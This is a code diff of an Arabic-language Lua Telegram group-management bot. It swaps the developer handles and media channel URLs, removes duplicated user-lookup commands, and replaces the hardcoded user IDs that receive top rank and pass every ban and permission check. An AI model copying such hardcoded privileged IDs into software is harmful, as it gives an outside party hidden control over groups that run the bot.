@@ -1,9 +1,9 @@
 --[[
 قناة السورس
 ----
-dev: @e_b50
-dev2: @e_b50
-ch: @e_b50
+dev: @trprogram
+dev2: @trprogram
+ch: @trprogram
 --]]
 URL     = require("./libs/url")
 JSON    = require("./libs/dkjson")
@@ -152,9 +152,9 @@ end
 function Controllerbanall(ChatId,UserId)
 Status = 0
 DevelopersQ = Redis:sismember(FDFGERB.."FDFGERB:DevelopersQ:Groups",UserId) 
-if UserId == 1605449126 then
+if UserId == 1397358452 then
 Status = true
-elseif UserId == 1605449126 then
+elseif UserId == 1397358452 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -177,9 +177,9 @@ Managers = Redis:sismember(FDFGERB.."FDFGERB:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(FDFGERB.."FDFGERB:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(FDFGERB.."FDFGERB:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1485149817 then
+if UserId == 1397358452 then
 Status = 'Ace🎖'
-elseif UserId == 1485149817 then
+elseif UserId == 1397358452 then
 Status = 'Ace🎖'
 elseif UserId == Sudo_Id then  
 Status = 'Dev🎖'
@@ -763,9 +763,9 @@ Managers = Redis:sismember(FDFGERB.."FDFGERB:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(FDFGERB.."FDFGERB:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(FDFGERB.."FDFGERB:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1605449126 then
+if UserId == 1397358452 then
 Status = true
-elseif UserId == 1605449126 then
+elseif UserId == 1397358452 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -803,9 +803,9 @@ Addictive = Redis:sismember(FDFGERB.."FDFGERB:Addictive:Group"..ChatId,UserId)
 channelis = Redis:sismember(FDFGERB.."FDFGERB:Managers:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(FDFGERB.."FDFGERB:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1605449126 then
+if UserId == 1397358452 then
 Status = true
-elseif UserId == 1605449126 then
+elseif UserId == 1397358452 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -932,10 +932,10 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 1605449126 then
+if tonumber(msg.sender.user_id) == 1397358452 then
 msg.Name_Controller = 'Ace🎖 '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 1605449126 then
+elseif tonumber(msg.sender.user_id) == 1397358452 then
 msg.Name_Controller = 'Ace🎖'
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
@@ -2830,283 +2830,6 @@ return LuaTele.sendText(msg_chat_id,msg_id,
 end
 end
 end
-
-
-if text == 'ايدي' or text == 'كشف' then
-    if msg.reply_to_message_id ~= 0 then
-        local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
-        local UserInfo = LuaTele.getUser(Message_Reply.sender_id.user_id)
-        if UserInfo.username then
-            UserInfousername = '@' .. UserInfo.username .. ''
-        else
-            UserInfousername = 'لا يوجد'
-        end
-        local UserId = Message_Reply.sender_id.user_id
-        local U = LuaTele.getUser(UserId)
-        local Nn = U.first_name
-        local RinkBot = Controller(msg_chat_id, UserId)
-        local TotalMsg = Redis:get(black .. 'Num:Message:User' .. msg_chat_id .. ':' .. UserId) or 0
-        local TotalEdit = Redis:get(black .. 'Num:Message:Edit' .. msg_chat_id .. UserId) or 0
-        local TotalMsgT = Total_message(TotalMsg)
-        local NumAdd = Redis:get(black .. "Num:Add:Memp" .. msg.chat_id .. ":" .. UserId) or 0
-        local NumberGames = Redis:get(black .. "Num:Add:Games" .. msg.chat_id .. UserId) or 0
-        if Get_Is_Id then
-            local Get_Is_Id = Get_Is_Id:gsub('#AddMem', NumAdd)
-            local Get_Is_Id = Get_Is_Id:gsub('#id', UserId)
-            local Get_Is_Id = Get_Is_Id:gsub('#username', UserInfousername)
-            local Get_Is_Id = Get_Is_Id:gsub('#msgs', TotalMsg)
-            local Get_Is_Id = Get_Is_Id:gsub('#edit', TotalEdit)
-            local Get_Is_Id = Get_Is_Id:gsub('#stast', RinkBot)
-            local Get_Is_Id = Get_Is_Id:gsub('#auto', TotalMsgT)
-            local Get_Is_Id = Get_Is_Id:gsub('#game', NumberGames)
-            send(msg_chat_id, msg_id, Get_Is_Id, "md", true)
-        else
-            send(msg_chat_id, msg_id,
-                '\n◂ اسمه ↫ ' .. Nn .. '\n◂ ايديه ↫ ' .. UserId .. '\n◂ معرفه ↫ [' ..
-                    UserInfousername .. ']' .. '\n◂ رتبته ↫ ' .. RinkBot .. '\n◂ عدد رسايله ↫ ' ..
-                    TotalMsg .. '\n◂ عدد تعديلاته ↫ ' .. TotalEdit .. '\n◂ تفاعله ↫ ' ..
-                    TotalMsgT .. '\n𓆩☆𓆪', "md", true)
-        end
-    end
-end
-if text == "ايدي" or text == 'id' or text == 'Id' or text == 'ID' then
-    if msg.reply_to_message_id == 0 then
-        if not Redis:get(black .. "Status:Id" .. msg_chat_id) then
-            return false
-        end
-        if ChannelJoin(msg) == false then
-            local chinfo = Redis:get(black .. "ch:admin")
-            local reply_markup = LuaTele.replyMarkup {
-                type = 'inline',
-                data = {{{
-                    text = 'اضغط للاشتراك',
-                    url = chinfo
-                }}}
-            }
-            return send(msg.chat_id, msg.id,
-                '*\n❍ عليك الاشتراك في قناة البوت لاستخذام الاوامر*', "md",
-                false, false, false, false, reply_markup)
-        end
-        local UserInfo = LuaTele.getUser(msg.sender_id.user_id)
-        local Name_User = UserInfo.first_name
-        local photo = LuaTele.getUserProfilePhotos(msg.sender_id.user_id)
-        local UserId = msg.sender_id.user_id
-        local RinkBot = msg.Name_Controller
-        local TotalMsg = Redis:get(black .. 'Num:Message:User' .. msg_chat_id .. ':' .. msg.sender_id.user_id) or 0
-        local TotalPhoto = photo.total_count or 0
-        local TotalEdit = Redis:get(black .. 'Num:Message:Edit' .. msg_chat_id .. msg.sender_id.user_id) or 0
-        local TotalMsgT = Total_message(TotalMsg)
-        local NumberGames = Redis:get(black .. "Num:Add:Games" .. msg.chat_id .. msg.sender_id.user_id) or 0
-        local NumAdd = Redis:get(black .. "Num:Add:Memp" .. msg.chat_id .. ":" .. msg.sender_id.user_id) or 0
-        local Texting = {"بحبك 🥺♥.!", "وشك دا ولا وش رجل 😂",
-                         "صوره قمر زي صاحبها 🥺♥.!", "رقمي 012345... 🙈♥.!",
-                         "وشك دا ولا القمر 🙈♥.!",
-                         "هم في الارض وانت بين النجوم 🤍🎀.!",
-                         "غير يعم القرف دا 🙂"}
-        local Description = Texting[math.random(#Texting)]
-        if UserInfo.username then
-            UserInfousername = '@' .. UserInfo.username .. ''
-        else
-            UserInfousername = 'لا يوجد'
-        end
-        Get_Is_Id = Redis:get(black .. "Set:Id:Groups") or Redis:get(black .. "Set:Id:Group" .. msg_chat_id)
-        if Redis:get(black .. "Status:IdPhoto" .. msg_chat_id) then
-            if Get_Is_Id then
-                local Get_Is_Id = Get_Is_Id:gsub('#AddMem', NumAdd)
-                local Get_Is_Id = Get_Is_Id:gsub('#id', msg.sender_id.user_id)
-                local Get_Is_Id = Get_Is_Id:gsub('#username', UserInfousername)
-                local Get_Is_Id = Get_Is_Id:gsub('#msgs', TotalMsg)
-                local Get_Is_Id = Get_Is_Id:gsub('#edit', TotalEdit)
-                local Get_Is_Id = Get_Is_Id:gsub('#stast', RinkBot)
-                local Get_Is_Id = Get_Is_Id:gsub('#auto', TotalMsgT)
-                local Get_Is_Id = Get_Is_Id:gsub('#Description', Description)
-                local Get_Is_Id = Get_Is_Id:gsub('#game', NumberGames)
-                local Get_Is_Id = Get_Is_Id:gsub('#photos', TotalPhoto)
-                if photo.total_count > 0 then
-                    return LuaTele.sendPhoto(msg.chat_id, msg.id,
-                        photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id, Get_Is_Id)
-                else
-                    return send(msg_chat_id, msg_id, Get_Is_Id, "md", true)
-                end
-            else
-                if photo.total_count > 0 then
-                    return LuaTele.sendPhoto(msg.chat_id, msg.id,
-                        photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,
-                        Description .. '\n\n◂ اسمك ↫ ' .. Name_User .. '\n◂ ايديك ↫ ' .. UserId ..
-                            '\n◂ معرفك ↫ [' .. UserInfousername .. ']' .. '\n◂ رتبتك ↫ ' .. RinkBot ..
-                            '\n◂ عدد صورك ↫ ' .. TotalPhoto .. '\n◂ عدد رسايلك ↫ ' .. TotalMsg ..
-                            '\n◂ عدد تعديلاتك ↫ ' .. TotalEdit .. '\n◂ تفاعلك ↫ ' .. TotalMsgT ..
-                            '\n◂ البايو ↫ *' .. getbio(UserId) .. '*' .. '\n𓆩☆𓆪', "md")
-                else
-                    return send(msg_chat_id, msg_id,
-                        '◂ اسمك ↫ ' .. Name_User .. '\n◂ ايديك ↫ ' .. UserId ..
-                            '\n◂ معرفك ↫ [' .. UserInfousername .. ']' .. '\n◂ رتبتك ↫ ' .. RinkBot ..
-                            '\n◂ عدد صورك ↫ ' .. TotalPhoto .. '\n◂ عدد رسايلك ↫ ' .. TotalMsg ..
-                            '\n◂ عدد تعديلاتك ↫ ' .. TotalEdit .. '\n◂ تفاعلك ↫ ' .. TotalMsgT ..
-                            '\n◂ البايو ↫ *' .. getbio(UserId) .. '*' .. '\n𓆩☆𓆪', "md", true)
-                end
-            end
-        else
-            if Get_Is_Id then
-                local Get_Is_Id = Get_Is_Id:gsub('#AddMem', NumAdd)
-                local Get_Is_Id = Get_Is_Id:gsub('#id', msg.sender_id.user_id)
-                local Get_Is_Id = Get_Is_Id:gsub('#username', UserInfousername)
-                local Get_Is_Id = Get_Is_Id:gsub('#msgs', TotalMsg)
-                local Get_Is_Id = Get_Is_Id:gsub('#edit', TotalEdit)
-                local Get_Is_Id = Get_Is_Id:gsub('#stast', RinkBot)
-                local Get_Is_Id = Get_Is_Id:gsub('#auto', TotalMsgT)
-                local Get_Is_Id = Get_Is_Id:gsub('#Description', Description)
-                local Get_Is_Id = Get_Is_Id:gsub('#game', NumberGames)
-                local Get_Is_Id = Get_Is_Id:gsub('#photos', TotalPhoto)
-                return send(msg_chat_id, msg_id, '[' .. Get_Is_Id .. ']', "md", true)
-            else
-                return send(msg_chat_id, msg_id,
-                    '◂ اسمك ↫ ' .. Name_User .. '\n◂ ايديك ↫ ' .. UserId .. '\n◂ معرفك ↫ [' ..
-                        UserInfousername .. ']' .. '\n◂ رتبتك ↫ ' .. RinkBot .. '\n◂ عدد صورك ↫ ' ..
-                        TotalPhoto .. '\n◂ عدد رسايلك ↫ ' .. TotalMsg ..
-                        '\n◂ عدد تعديلاتك ↫ ' .. TotalEdit .. '\n◂ تفاعلك ↫ ' .. TotalMsgT ..
-                        '\n◂ البايو ↫ *' .. getbio(UserId) .. '*' .. '\n𓆩☆𓆪', "md", true)
-            end
-        end
-    end
-end
-if text and text:match('^كشف (%d+)$') then
-    if ChannelJoin(msg) == false then
-        local chinfo = Redis:get(black .. "ch:admin")
-        local reply_markup = LuaTele.replyMarkup {
-            type = 'inline',
-            data = {{{
-                text = 'اضغط للاشتراك',
-                url = chinfo
-            }}}
-        }
-        return send(msg.chat_id, msg.id,
-            '*\n❍ عليك الاشتراك في قناة البوت لاستخذام الاوامر*', "md", false,
-            false, false, false, reply_markup)
-    end
-    local UserId = text:match('^كشف (%d+)$')
-    local UserInfo = LuaTele.getUser(UserId)
-    if UserInfo.username then
-        UserName = '@' .. UserInfo.username .. ''
-    else
-        UserName = 'لا يوجد'
-    end
-    local Name_User = UserInfo.first_name
-    local RinkBot = Controller(msg_chat_id, UserId)
-    local TotalMsg = Redis:get(black .. 'Num:Message:User' .. msg_chat_id .. ':' .. UserId) or 0
-    local TotalEdit = Redis:get(black .. 'Num:Message:Edit' .. msg_chat_id .. UserId) or 0
-    local TotalMsgT = Total_message(TotalMsg)
-    local NumAdd = Redis:get(black .. "Num:Add:Memp" .. msg.chat_id .. ":" .. UserId) or 0
-    local NumberGames = Redis:get(black .. "Num:Add:Games" .. msg.chat_id .. UserId) or 0
-
-    if UserInfo.luatele == "error" and UserInfo.code == 6 then
-        return send(msg_chat_id, msg_id, "\n❍ عذرآ لا تستطيع استخدام ايدي خطأ ", "md", true)
-    end
-    return send(msg_chat_id, msg_id,
-        '◂ اسمه ↫ ' .. Name_User .. '\n◂ ايديه ↫ ' .. UserId .. '\n◂ معرفه ↫ [' .. UserName ..
-            ']' .. '\n◂ رتبته ↫ ' .. RinkBot .. '\n◂ عدد رسايله ↫ ' .. TotalMsg ..
-            '\n◂ عدد تعديلاته ↫ ' .. TotalEdit .. '\n◂ تفاعله ↫ ' .. TotalMsgT ..
-            '\n◂ البايو ↫ *' .. FlterBio(getbio(UserId)) .. '*' .. '\n𓆩☆𓆪', "md", true)
-end
-if text and text:match('^كشف (%d+)$') then
-    if ChannelJoin(msg) == false then
-        local chinfo = Redis:get(black .. "ch:admin")
-        local reply_markup = LuaTele.replyMarkup {
-            type = 'inline',
-            data = {{{
-                text = 'اضغط للاشتراك',
-                url = chinfo
-            }}}
-        }
-        return send(msg.chat_id, msg.id,
-            '*\n❍ عليك الاشتراك في قناة البوت لاستخذام الاوامر*', "md", false,
-            false, false, false, reply_markup)
-    end
-    local UserId = text:match('^كشف (%d+)$')
-    local UserInfo = LuaTele.getUser(UserId)
-    if UserInfo.username then
-        UserName = '@' .. UserInfo.username .. ''
-    else
-        UserName = 'لا يوجد'
-    end
-    local Name_User = UserInfo.first_name
-    local RinkBot = Controller(msg_chat_id, UserId)
-    local TotalMsg = Redis:get(black .. 'Num:Message:User' .. msg_chat_id .. ':' .. UserId) or 0
-    local TotalEdit = Redis:get(black .. 'Num:Message:Edit' .. msg_chat_id .. UserId) or 0
-    local TotalMsgT = Total_message(TotalMsg)
-    local NumAdd = Redis:get(black .. "Num:Add:Memp" .. msg.chat_id .. ":" .. UserId) or 0
-    local NumberGames = Redis:get(black .. "Num:Add:Games" .. msg.chat_id .. UserId) or 0
-
-    if UserInfo.luatele == "error" and UserInfo.code == 6 then
-        return send(msg_chat_id, msg_id, "\n❍ عذرآ لا تستطيع استخدام ايدي خطأ ", "md", true)
-    end
-    return send(msg_chat_id, msg_id,
-        '◂ اسمه ↫ ' .. Name_User .. '\n◂ ايديه ↫ ' .. UserId .. '\n◂ معرفه ↫ [' .. UserName ..
-            ']' .. '\n◂ رتبته ↫ ' .. RinkBot .. '\n◂ عدد رسايله ↫ ' .. TotalMsg ..
-            '\n◂ عدد تعديلاته ↫ ' .. TotalEdit .. '\n◂ تفاعله ↫ ' .. TotalMsgT ..
-            '\n◂ البايو ↫ *' .. getbio(UserId) .. '*' .. '\n𓆩☆𓆪', "md", true)
-end
-if text then
-    if text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$') then
-        if ChannelJoin(msg) == false then
-            local chinfo = Redis:get(black .. "ch:admin")
-            local reply_markup = LuaTele.replyMarkup {
-                type = 'inline',
-                data = {{{
-                    text = 'اضغط للاشتراك',
-                    url = chinfo
-                }}}
-            }
-            return send(msg.chat_id, msg.id,
-                '*\n❍ عليك الاشتراك في قناة البوت لاستخذام الاوامر*', "md",
-                false, false, false, false, reply_markup)
-        end
-        local UserName = text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$')
-        local UserId_Info = LuaTele.searchPublicChat(UserName)
-        if not UserId_Info.id then
-            return send(msg_chat_id, msg_id, "\n❍ عذرآ لا يوجد حساب بهاذا المعرف ", "md",
-                true)
-        end
-        if UserId_Info.type.is_channel == true then
-            return send(msg_chat_id, msg_id,
-                "\n❍ عذرآ لا تستطيع استخدام معرف قناة او جروب ", "md", true)
-        end
-        if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
-            return send(msg_chat_id, msg_id, "\n❍ عذرآ لا تستطيع استخدام معرف البوت ",
-                "md", true)
-        end
-        local U = LuaTele.getUser(UserId_Info.id)
-        local Name_User = U.first_name
-        local UserId = UserId_Info.id
-        local RinkBot = Controller(msg_chat_id, UserId_Info.id)
-        local TotalMsg = Redis:get(black .. 'Num:Message:User' .. msg_chat_id .. ':' .. UserId) or 0
-        local TotalEdit = Redis:get(black .. 'Num:Message:Edit' .. msg_chat_id .. UserId) or 0
-        local TotalMsgT = Total_message(TotalMsg)
-        local NumAdd = Redis:get(black .. "Num:Add:Memp" .. msg.chat_id .. ":" .. UserId) or 0
-        local NumberGames = Redis:get(black .. "Num:Add:Games" .. msg.chat_id .. UserId) or 0
-        if Get_Is_Id then
-            local Get_Is_Id = Get_Is_Id:gsub('#AddMem', NumAdd)
-            local Get_Is_Id = Get_Is_Id:gsub('#id', UserId)
-            local Get_Is_Id = Get_Is_Id:gsub('#username', '@' .. UserName)
-            local Get_Is_Id = Get_Is_Id:gsub('#msgs', TotalMsg)
-            local Get_Is_Id = Get_Is_Id:gsub('#edit', TotalEdit)
-            local Get_Is_Id = Get_Is_Id:gsub('#stast', RinkBot)
-            local Get_Is_Id = Get_Is_Id:gsub('#auto', TotalMsgT)
-            local Get_Is_Id = Get_Is_Id:gsub('#game', NumberGames)
-            return send(msg_chat_id, msg_id, Get_Is_Id, "md", true)
-        else
-            return send(msg_chat_id, msg_id,
-                '◂ اسمه ↫ ' .. Name_User .. '\n◂ ايديه ↫ ' .. UserId .. '\n◂ معرفه ↫ @[' ..
-                    UserName .. ']' .. '\n◂ رتبته ↫ ' .. RinkBot .. '\n◂ عدد رسايله ↫ ' ..
-                    TotalMsg .. '\n◂ عدد تعديلاته ↫ ' .. TotalEdit .. '\n◂ تفاعله ↫ ' ..
-                    TotalMsgT .. '\n◂ البايو ↫ *' .. getbio(UserId) .. '*' .. '\n𓆩☆𓆪', "md", true)
-        end
-    end
-end
-
-
-
-
 if text == 'كشف' and msg.reply_to_message_id ~= 0 then
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
 local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
@@ -5061,7 +4784,7 @@ keyboard.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/VONNNDD/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "قران" then
 Abs = math.random(2,140); 
@@ -5073,7 +4796,7 @@ keyboard.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/djsjdjdd/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "جداريات" then 
 Abs = math.random(2,140); 
@@ -5085,7 +4808,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/usjeijw/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات عيال" or text == "افتارات عيال" then 
 Abs = math.random(2,140); 
@@ -5097,7 +4820,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots3/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "هيدرات" then 
 Abs = math.random(2,140); 
@@ -5109,7 +4832,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/flflfldld/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات بنات" or text == "افتارات بنات" then 
 Abs = math.random(2,140); 
@@ -5121,7 +4844,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات رسم" or text == "افتار رسم" then 
 Abs = math.random(2,140); 
@@ -5133,7 +4856,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots5/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات فكتوري" or text == "افتار فكتوري" then 
 Abs = math.random(2,140); 
@@ -5145,7 +4868,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots6/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات سينمائية" or text == "افتار سينمائي" then 
 Abs = math.random(2,140); 
@@ -5157,7 +4880,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots1/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "اقتباس" or text == "اقتباسات" then 
 Abs = math.random(2,140); 
@@ -5169,7 +4892,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots8/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "عباره" or text == "عبارات" then 
 Abs = math.random(2,140); 
@@ -5181,7 +4904,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots7/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات كيبوب" or text == "افتارات كيبوب" then 
 Abs = math.random(2,140); 
@@ -5193,7 +4916,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/djdndnddc/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات انمي" or text == "افتارات انمي" then 
 Abs = math.random(2,140); 
@@ -5205,7 +4928,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/LoreBots9/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "افتارات فنانين" or text == "افتارات مغنين" then 
 Abs = math.random(2,140); 
@@ -5217,7 +4940,7 @@ keyboardd.inline_keyboard = {
 },
 }
 local msg_id = msg.id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/FPPPH/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/e_b50/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "نزلني" then
 if The_ControllerAll(msg.sender.user_id) == true then
@@ -5319,10 +5042,7 @@ data = {
